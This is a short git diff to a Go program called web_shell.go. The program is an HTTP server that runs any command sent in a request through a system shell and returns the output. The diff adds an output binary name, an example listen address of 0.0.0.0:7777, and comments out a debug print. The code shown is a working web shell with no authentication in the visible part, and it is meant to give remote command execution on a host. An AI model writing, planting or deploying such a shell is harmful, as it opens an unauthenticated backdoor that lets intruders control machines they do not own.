@@ -13,11 +13,11 @@ var (
 	addr string
 )
 
-// CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build web_shell.go
+// CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o gws web_shell.go
 
 func main() {
 	if len(os.Args) !=2  {
-		fmt.Printf("Usage: %s <listenAddress> \n", os.Args[0])
+		fmt.Printf("Usage: %s <listenAddress> , e.g. 0.0.0.0:7777\n", os.Args[0])
 		os.Exit(1)
 	}
 	addr = os.Args[1]
@@ -34,7 +34,7 @@ func requestHandler(w http.ResponseWriter, req *http.Request) {
 
 	command := exec.Command(shell, shellArg, cmd)
 	output, err := command.Output()
-	fmt.Printf("%T ->  %v\n",output,output)   // for debug
+	//fmt.Printf("%T ->  %v\n",output,output)   // for debug
 	_,err = w.Write([]byte(fmt.Sprintf("cmd: %v, result: \n%v\n",cmd, string(output))))
 	_ = err
 }
